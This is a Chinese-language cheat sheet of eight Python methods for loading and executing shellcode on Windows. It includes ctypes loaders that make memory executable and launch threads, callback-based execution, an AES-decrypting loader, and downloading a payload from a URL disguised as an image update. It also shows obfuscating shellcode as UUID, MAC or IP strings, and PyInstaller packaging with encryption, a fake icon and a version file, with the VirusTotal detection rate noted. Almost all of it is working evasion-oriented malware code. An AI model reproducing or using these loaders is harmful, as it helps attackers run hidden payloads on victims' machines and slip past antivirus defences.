# 05 - Python Shellcode加载（8种方法）

## 方法1：ctypes基础加载
```python
import ctypes, sys
shellcode = b"\xfc\x48\x83..."
buf = ctypes.create_string_buffer(shellcode, len(shellcode))
ptr = ctypes.cast(buf, ctypes.c_void_p)
ctypes.windll.kernel32.VirtualProtect(ptr, len(shellcode), 0x40, ctypes.byref(ctypes.c_ulong()))
ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(-1, -1)
```

## 方法2：回调函数执行
```python
# CallWindowProc
ctypes.windll.user32.CallWindowProcA(ptr, 0, 0, 0, 0)
# EnumFonts
ctypes.windll.gdi32.EnumFontsW(None, None, ptr, 0)
```

## 方法3：AES解密加载
```python
from Crypto.Cipher import AES
import ctypes

key = b'16bytekey1234567'
iv = b'16byteiv12345678'
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = open('payload.enc', 'rb').read()
shellcode = cipher.decrypt(encrypted)

buf = ctypes.create_string_buffer(shellcode, len(shellcode))
ptr = ctypes.cast(buf, ctypes.c_void_p)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
addr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.memmove(addr, ptr, len(shellcode))
ctypes.windll.kernel32.CreateThread(0, 0, addr, 0, 0, 0)
```

## 方法4：远程下载shellcode
```python
import requests, ctypes
url = "https://cdn.legit.com/img/update.bin"
shellcode = requests.get(url, verify=True).content
# ... 加载逻辑
```

## 方法5：UUID格式加载
```python
import uuid, ctypes
uuids = ["e48148fc-0000-0010-8b52...", ...]
shellcode = b''.join(uuid.UUID(u).bytes_le for u in uuids)
```

## 方法6：Mac地址格式
```python
macs = ["FC-48-83-E4-F0-E8", "C8-00-00-00-41-51", ...]
shellcode = bytes(int(b, 16) for m in macs for b in m.split('-'))
```

## 方法7：IPv4/IPv6格式
```python
ips = ["252.72.131.228", "240.232.200.0", ...]
shellcode = bytes(int(o) for ip in ips for o in ip.split('.'))
```

## 方法8：PyInstaller打包（推荐 ⭐⭐⭐）
```bash
# 一步生成exe
pyinstaller -Fw --hidden-import=ctypes \
  --hidden-import=requests \
  --hidden-import=Crypto \
  --noupx --clean loader.py
# VT: ~17/72
```

### PyInstaller增强
```bash
# 配合自定义spec文件控制打包细节
# 使用--key参数加密pyc
pyinstaller -Fw --key=YourEncryptKey2025 \
  --hidden-import=all,needed,modules \
  --version-file=version.txt \
  --icon=legit.ico loader.py
```
